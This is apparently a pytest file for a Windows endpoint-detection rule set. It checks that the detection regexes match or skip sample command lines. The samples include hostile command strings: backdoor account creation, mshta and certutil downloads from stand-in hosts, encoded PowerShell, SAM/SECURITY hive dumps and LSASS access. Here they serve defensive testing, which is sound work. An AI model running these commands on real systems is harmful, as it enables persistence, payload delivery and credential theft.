"""Detection-content tests: gene rules and tap rules must be valid AND behave.

These lock in the 1.0.0 FP/FN audit:
  * every baseline.gen line is valid JSON with compileable, correctly-escaped
    regexes (a JSON/regex escaping bug previously made the net-account-add
    rule unmatchable);
  * match / no-match behavior for the audited rules (positive and negative
    cases so an over-broad edit cannot silently return);
  * tap rules structural invariants that plasma-tap.render depends on
    (no '|' or newlines in fields, known severities, resolvable providers).
"""
import json
import re
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
BASELINE = REPO / "sensors" / "plasma-baseline.gen"
TAP_RULES = REPO / "sensors" / "plasma-tap-rules.json"

KNOWN_PROVIDERS = {
    "powershell": "Microsoft-Windows-PowerShell",
    "wmi": "Microsoft-Windows-WMI-Activity",
    "dns": "Microsoft-Windows-DNS-Client",
    "dotnet": "Microsoft-Windows-DotNETRuntime",
    "schannel": "Microsoft-Windows-Schannel",
    "security": "Microsoft-Windows-Security-Auditing",
}
KNOWN_SEVERITIES = {"low", "medium", "high", "critical"}


def _baseline_rules():
    return [json.loads(l) for l in BASELINE.read_text(encoding="utf-8").splitlines() if l.strip()]


def _match_expr(rule_match: str) -> "re.Pattern":
    """Extract the regex body from a gene match string like
    '$img: Image ~= '(...')'  and compile it."""
    body = rule_match.split("~=", 1)[1].strip().strip("'")
    return re.compile(body)


def _rule_by_name(rules, name):
    for r in rules:
        if r["Name"] == name:
            return r
    raise AssertionError(f"rule {name!r} missing from baseline.gen")


# ---------------------------------------------------------------------------
# structural validity
# ---------------------------------------------------------------------------

def test_baseline_every_line_is_valid_json_with_compileable_regex():
    rules = _baseline_rules()
    assert len(rules) == 25
    for obj in rules:
        assert obj["Meta"]["Schema"] == "1.0.0"
        assert obj["Meta"]["EventIDs"], obj["Name"]
        for m in obj["Matches"]:
            name, _, expr = m.partition(": ")
            assert name.startswith("$") and "~=" in expr, m
            _match_expr(m)  # raises re.error on bad regex


def test_baseline_conditions_reference_declared_matches():
    for obj in _baseline_rules():
        declared = {m.partition(":")[0].strip().lstrip("$") for m in obj["Matches"]}
        cond_vars = set(re.findall(r"\$(\w+)", obj["Condition"]))
        assert cond_vars <= declared, (obj["Name"], cond_vars, declared)


# ---------------------------------------------------------------------------
# behavioral: Plasma Net Account Add (was a dead rule — Image had trailing \s)
# ---------------------------------------------------------------------------

def test_net_account_add_fires_on_real_sysmon_image_path():
    rule = _rule_by_name(_baseline_rules(), "Plasma Net Account Add")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
    assert img.search(r"C:\Windows\System32\net1.exe")
    assert img.search(r"C:\Windows\System32\net.exe")
    assert not img.search(r"C:\Users\bob\tools\net1.exe.bak")
    cmdline = "net1 user backdoor P@ss /add"
    assert add.search(cmdline)
    assert add.search("net  localgroup administrators bob /add")
    assert add.search("net user bob 'P@ss' add")


def test_net_account_add_does_not_fire_on_net_time():
    rule = _rule_by_name(_baseline_rules(), "Plasma Net Account Add")
    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
    assert not add.search("net time \\\\dc01 /domain")
    assert not add.search("net use Z: \\\\server\\share")


# ---------------------------------------------------------------------------
# behavioral: Mshta Network stays UNC/URL-scoped (no local-path matches)
# ---------------------------------------------------------------------------

def test_mshta_network_matches_remote_only():
    rule = _rule_by_name(_baseline_rules(), "Plasma Mshta Network")
    net = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$net"))
    assert net.search("mshta http://evil.example/x.hta")
    assert net.search("mshta https://evil.example/x.hta")
    assert net.search(r"mshta \\evil.example\share\x.hta")
    assert not net.search(r"mshta C:\Windows\Phishing\alert.hta")
    assert not net.search("mshta calc.hta")


# ---------------------------------------------------------------------------
# behavioral: Office spawn child set includes mshta; encoded cmd covers -ec
# ---------------------------------------------------------------------------

def test_office_spawn_covers_mshta_child():
    rule = _rule_by_name(_baseline_rules(), "Plasma Office Spawning Shell")
    child = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$child"))
    for exe in ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe"):
        assert child.search(rf"C:\Windows\System32\{exe}"), exe
    assert not child.search(r"C:\Windows\System32\notepad.exe")


def test_encoded_cmd_covers_short_and_long_forms():
    rule = _rule_by_name(_baseline_rules(), "Plasma Encoded Cmd")
    enc = _match_expr(rule["Matches"][0])
    assert enc.search("powershell -enc SQBFAFgA")
    assert enc.search("powershell -ec SQBFAFgA")
    assert enc.search("powershell -EncodedCommand SQBFAFgA")
    assert enc.search("powershell -encodedcommand SQBFAFgA")
    assert enc.search("powershell -e SQBFAFgA")
    assert enc.search("powershell -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcA")
    assert not enc.search("powershell -NoProfile -Command Get-Date")
    assert not enc.search("powershell -e Get-Date")
    assert not enc.search(" powershellenc ")


# ---------------------------------------------------------------------------
# tap rules: renderer invariants (pipe format cannot round-trip these chars)
# ---------------------------------------------------------------------------

def test_tap_rules_structure_is_renderable():
    doc = json.loads(TAP_RULES.read_text(encoding="utf-8"))
    assert doc["version"] == 1
    assert set(doc["providers"]) == set(KNOWN_PROVIDERS)
    seen = set()
    for r in doc["rules"]:
        assert r["name"] not in seen, f"duplicate rule {r['name']}"
        seen.add(r["name"])
        assert r["provider"] in doc["providers"], r["name"]
        assert r["severity"] in KNOWN_SEVERITIES, r["name"]
        assert isinstance(r["event_id"], int) and r["event_id"] >= 0, r["name"]
        for field in ("substr", "field"):
            assert "|" not in r.get(field, ""), (r["name"], field)
            assert "\n" not in r.get(field, ""), (r["name"], field)
        assert r["technique"].startswith("T"), r["name"]


def test_tap_rules_security_channel_not_in_realtime_rules():
    """Audit events never re-appear on realtime ETW — identity.py owns them."""
    doc = json.loads(TAP_RULES.read_text(encoding="utf-8"))
    for r in doc["rules"]:
        assert r["provider"] != "security", r["name"]

# ---------------------------------------------------------------------------
# behavioral: 1.3.0 rules (rollup + fidelity release)
# ---------------------------------------------------------------------------

def test_file_delete_by_lolbin_matches_binaries_only():
    rule = _rule_by_name(_baseline_rules(), "Plasma File Delete by LOLBin")
    # 23 is the archived FileDelete the shipped config enables; 26 is not
    # enabled, so citing it would make the rule dormant.
    assert rule["Meta"]["EventIDs"] == [23]
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    ext = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$ext"))
    assert img.search(r"C:\Windows\System32\powershell.exe")
    assert img.search(r"C:\Windows\System32\certutil.exe")
    assert not img.search(r"C:\Windows\explorer.exe")
    assert ext.search(r"C:\Users\bob\payload.exe")
    assert ext.search(r"C:\Users\bob\archive.7z")
    assert not ext.search(r"C:\Users\bob\notes.txt")


def test_run_key_persistence_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Run Key Persistence")
    reg = _match_expr(rule["Matches"][0])
    assert reg.search(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater")
    assert reg.search(r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Once1")
    assert not reg.search(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\X")


def test_service_registry_persistence_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Service Registry Persistence")
    svc = _match_expr(rule["Matches"][0])
    assert svc.search(r"HKLM\System\CurrentControlSet\Services\Evil\ImagePath")
    assert not svc.search(r"HKLM\System\CurrentControlSet\Control\Lsa")


def test_privileged_group_add_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Privileged Group Add")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
    assert img.search(r"C:\Windows\System32\net1.exe")
    assert add.search("net1 localgroup administrators bob /add")
    assert add.search("net localgroup administrators_2 svc /add")
    assert not add.search("net localgroup users bob /add")
    assert not add.search("net localgroup administrators")


def test_execution_from_user_paths_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Execution From User Paths")
    img = _match_expr(rule["Matches"][0])
    assert img.search(r"C:\Users\bob\Downloads\setup.exe")
    assert img.search(r"C:\Users\bob\AppData\Local\Temp\a.exe")
    assert img.search(r"C:\Users\Public\drop.exe")
    assert not img.search(r"C:\Program Files\App\app.exe")



def test_sensitive_file_delete_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Sensitive File Delete")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    path = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$path"))
    assert img.search(r"C:\Windows\System32\cmd.exe")
    assert path.search(r"C:\Users\bob\Documents\Q4.xlsx")
    assert path.search(r"C:\Users\bob\Desktop\notes")
    assert path.search(r"D:\Finance\payroll.csv")
    assert not path.search(r"C:\Windows\Temp\scratch.tmp")
    assert not path.search(r"C:\Users\bob\AppData\Local\Temp\x.tmp")


def test_hidden_file_attribute_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Hidden File Attribute")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    hide = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$hide"))
    assert img.search(r"C:\Windows\System32\attrib.exe")
    assert hide.search(r"attrib.exe +h C:\Users\bob\secret.docx")
    assert not hide.search(r"attrib.exe -h C:\Users\bob\secret.docx")


def test_registry_evasion_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Registry Evasion")
    reg = _match_expr(rule["Matches"][0])
    assert reg.search(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt")
    assert reg.search(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden")
    assert not reg.search(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\TaskbarGlomLevel")

# ---------------------------------------------------------------------------
# TTPForge-driven coverage: masquerade, PowerShell download, WMI recon
# ---------------------------------------------------------------------------

def _masquerade(rule, image: str) -> bool:
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    ok = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$ok"))
    return bool(img.search(image)) and not ok.search(image)


def test_masqueraded_system_binary_fires_outside_system32():
    rule = _rule_by_name(_baseline_rules(), "Plasma Masqueraded System Binary")
    assert _masquerade(rule, r"C:\Windows\Temp\svchost.exe") is True
    assert _masquerade(rule, r"C:\Users\Public\lsass.exe") is True
    assert _masquerade(rule, r"C:\Program Files\Acme\services.exe") is True
    assert _masquerade(rule, r"C:\Windows\System32\svchost.exe") is False
    assert _masquerade(rule, r"C:\Windows\SysWOW64\conhost.exe") is False
    assert _masquerade(rule, r"C:\Windows\WinSxS\x86_microsoft\services.exe") is False
    assert _masquerade(rule, r"C:\Windows\System32\notepad.exe") is False


def test_powershell_download_rule_matches_webclient_and_webrequest():
    rule = _rule_by_name(_baseline_rules(), "Plasma PowerShell Download")
    expr = _match_expr(rule["Matches"][0])
    assert expr.search("(New-Object System.Net.WebClient).DownloadFile('http://x','y')")
    assert expr.search("Invoke-WebRequest -Uri https://example.invalid/a")
    assert expr.search("$c.DownloadString($url)")
    assert not expr.search("Get-ChildItem C:\\Users")


def test_wmi_recon_rule_matches_system_classes_only():
    rule = _rule_by_name(_baseline_rules(), "Plasma WMI Recon")
    expr = _match_expr(rule["Matches"][0])
    assert expr.search("Get-WmiObject -Class Win32_ComputerSystem")
    assert expr.search("Get-CimInstance -ClassName Win32_OperatingSystem")
    assert expr.search("Get-CimInstance Win32_UserAccount")
    assert not expr.search("Get-CimInstance -ClassName Custom_AppSettings")


def test_wmic_recon_rule_matches_queries_not_process_create():
    rule = _rule_by_name(_baseline_rules(), "Plasma Wmic Recon")
    img = _match_expr(rule["Matches"][0])
    query = _match_expr(rule["Matches"][1])
    assert img.search(r"C:\Windows\System32\wmic.exe")
    assert query.search("wmic os get Caption")
    assert query.search("wmic useraccount list full")
    assert not query.search("wmic process call create calc.exe")



def test_sam_hive_dump_covers_the_security_hive():
    rule = _rule_by_name(_baseline_rules(), "Plasma SAM Hive Dump")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    sam = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$sam"))
    assert img.search(r"C:\Windows\System32\reg.exe")
    assert sam.search("reg save HKLM\\SYSTEM C:\\Temp\\sys")
    assert sam.search("reg save HKLM\\SECURITY C:\\Temp\\sec")
    assert not sam.search("reg export HKLM\\SOFTWARE C:\\Temp\\soft")


def test_privileged_group_add_handles_quoted_names():
    rule = _rule_by_name(_baseline_rules(), "Plasma Privileged Group Add")
    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
    assert add.search('net localgroup "Domain Admins" jdoe /add /domain')
    assert add.search('net localgroup "administrators" jdoe /add')
    assert not add.search('net localgroup "Users" jdoe /add')


def test_pipe_rule_covers_psexesvc_and_metasploit():
    rule = _rule_by_name(_baseline_rules(), "Plasma Suspicious Named Pipe")
    pipe = _match_expr(rule["Matches"][0])
    assert pipe.search("\\psexesvc\\PSEXESVC")
    assert pipe.search("\\MSSE-1337-server")
    assert pipe.search("\\paexec\\svc")
    assert not pipe.search("\\bleep\\bloop")


def test_masquerade_deeper_system32_path_fires():
    # The spool\drivers\color drop path is inside System32 but is not the
    # system directory itself: a system-binary name there must still fire.
    rule = _rule_by_name(_baseline_rules(), "Plasma Masqueraded System Binary")
    assert _masquerade(rule, r"C:\Windows\System32\spool\drivers\color\svchost.exe") is True
    assert _masquerade(rule, r"C:\Windows\SysWOW64\deep\nested\lsass.exe") is True
    assert _masquerade(rule, r"C:\Windows\servicing\svchost.exe") is False


def test_powershell_download_aliases_and_url_anchor():
    rule = _rule_by_name(_baseline_rules(), "Plasma PowerShell Download")
    expr = _match_expr(rule["Matches"][0])
    assert expr.search("iwr http://203.0.113.9/x.ps1 -OutFile C:\\Temp\\x.ps1")
    assert expr.search("wget https://example.invalid/payload")
    assert expr.search("$c = New-Object Net.WebClient")
    # Package managers quoting a variable URL are not a download alert.
    assert not expr.search("Invoke-WebRequest $url")


def test_certutil_covers_slash_flags_and_verifyctl():
    rule = _rule_by_name(_baseline_rules(), "Plasma LOLBin Certutil")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    url = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$url"))
    assert url.search("certutil /urlcache /split /f http://x C:\\p.exe")
    assert url.search("certutil -verifyctl -f http://x C:\\p.exe")
    assert url.search("certutil /decode in out")
    assert img.search(r"C:\Windows\System32\certutil.exe")
    assert not url.search("certutil -hashfile a b")


def test_service_registry_covers_controlset001_and_stays_anchored():
    rule = _rule_by_name(_baseline_rules(), "Plasma Service Registry Persistence")
    svc = _match_expr(rule["Matches"][0])
    assert svc.search(r"HKLM\System\ControlSet001\Services\Evil\ImagePath")
    assert svc.search(r"HKLM\System\CurrentControlSet\Services\Evil")
    assert not svc.search(r"HKLM\System\CurrentControlSet\Control\Lsa")
    # A value deep below a service key is not the service itself.
    assert not svc.search(r"HKLM\System\ControlSet003\Services\Evil\Parameters\Nested")


def test_execution_from_user_paths_covers_programdata_and_roaming():
    rule = _rule_by_name(_baseline_rules(), "Plasma Execution From User Paths")
    img = _match_expr(rule["Matches"][0])
    assert img.search(r"C:\ProgramData\update.exe")
    assert img.search(r"C:\Users\bob\AppData\Roaming\drop\tool.exe")
    assert img.search(r"C:\Users\bob\AppData\Local\6f2a1\svchost.exe")
    assert not img.search(r"C:\Program Files\App\app.exe")


def test_lsass_access_allows_credential_scanners_and_crash_dumps():
    rule = _rule_by_name(_baseline_rules(), "Plasma LSASS Access")
    target = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$target"))
    access = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$access"))
    caller = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$caller"))
    assert target.search(r"C:\Windows\system32\lsass.exe")
    assert access.search("0x1fffff")
    assert caller.search(r"C:\Windows\System32\WerFault.exe")
    assert caller.search(r"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe")
    assert not caller.search(r"C:\Temp\rundll32.exe")
